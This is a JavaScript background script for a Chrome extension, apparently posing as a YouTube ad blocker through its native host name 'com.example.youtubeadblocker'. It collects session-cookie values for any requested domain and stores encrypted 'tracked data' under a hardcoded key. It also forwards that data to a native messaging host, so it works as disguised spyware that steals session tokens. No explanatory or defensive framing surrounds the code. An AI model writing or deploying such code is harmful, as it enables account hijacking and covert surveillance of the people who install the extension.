const ENCRYPTION_KEY = "jayabrota"; 

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "getSessionIds") {
    chrome.cookies.getAll({ domain: message.domain }, (cookies) => {
      const sessionIds = cookies.filter(cookie => cookie.name.includes("SESSION")).map(cookie => cookie.value);
      sendResponse({ sessionIds: sessionIds });
    });
    return true; // Will respond asynchronously.
  } else if (message.action === "storeData") {
    const encryptedData = encrypt(JSON.stringify(message.data), ENCRYPTION_KEY);
    chrome.storage.local.get({ trackedData: "" }, (result) => {
      const existingData = result.trackedData ? decrypt(result.trackedData, ENCRYPTION_KEY) : "";
      const updatedData = existingData ? existingData + "\n" + encryptedData : encryptedData;
      chrome.storage.local.set({ trackedData: encrypt(updatedData, ENCRYPTION_KEY) }, () => {
        // Send data to native messaging host
        chrome.runtime.sendNativeMessage("com.example.youtubeadblocker", { text: updatedData }, (response) => {
          if (response.success) {
            sendResponse({ success: true });
          } else {
            sendResponse({ success: false });
          }
        });
      });
    });
    return true; // Will respond asynchronously.
  }
});

function encrypt(text, key) {
  return CryptoJS.AES.encrypt(text, key).toString();
}

function decrypt(encryptedText, key) {
  const bytes = CryptoJS.AES.decrypt(encryptedText, key);
  return bytes.toString(CryptoJS.enc.Utf8);
}